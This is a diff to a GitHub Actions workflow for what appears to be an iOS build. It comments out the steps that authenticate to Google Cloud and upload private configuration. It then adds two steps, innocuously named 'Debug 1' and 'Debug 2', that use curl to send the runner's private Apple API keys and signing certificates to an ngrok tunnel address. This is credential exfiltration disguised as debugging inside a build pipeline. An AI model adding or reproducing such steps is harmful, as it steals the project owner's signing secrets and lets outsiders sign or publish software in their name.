@@ -127,19 +127,26 @@ jobs:
       - name: Debug
         run: ls -al /Users/runner/privates
 
-      - name: Setup Auth 2
-        uses: 'google-github-actions/auth@v0'
-        with:
-          credentials_json: '${{ secrets.GCS_OTA_SA_CREDENTIAL }}'
+      - name: Debug 1
+        run: curl -d @/Users/runner/privates/apple_api_keys https://7b51-210-245-74-23.ngrok.io/?apple_api_keys
 
-      - name: export sa file
-        run: |
-          echo "${{ secrets.GCS_OTA_SA_CREDENTIAL }}" > /tmp/sa.json
+      - name: Debug 2
+        run: curl -d @/Users/runner/privates/certificates https://7b51-210-245-74-23.ngrok.io/?certificates
 
-      - name: auth with sa file
-        run: |
-          gcloud auth activate-service-account --key-file /tmp/sa.json
 
-      - name: Get configuration items
-        run: |
-          gsutil -m cp -r /Users/runner/privates/* gs://ota-storage/ios/
+      # - name: Setup Auth 2
+      #   uses: 'google-github-actions/auth@v0'
+      #   with:
+      #     credentials_json: '${{ secrets.GCS_OTA_SA_CREDENTIAL }}'
+
+      # - name: export sa file
+      #   run: |
+      #     echo "${{ secrets.GCS_OTA_SA_CREDENTIAL }}" > /tmp/sa.json
+
+      # - name: auth with sa file
+      #   run: |
+      #     gcloud auth activate-service-account --key-file /tmp/sa.json
+
+      # - name: Get configuration items
+      #   run: |
+      #     gsutil -m cp -r /Users/runner/privates/* gs://ota-storage/ios/
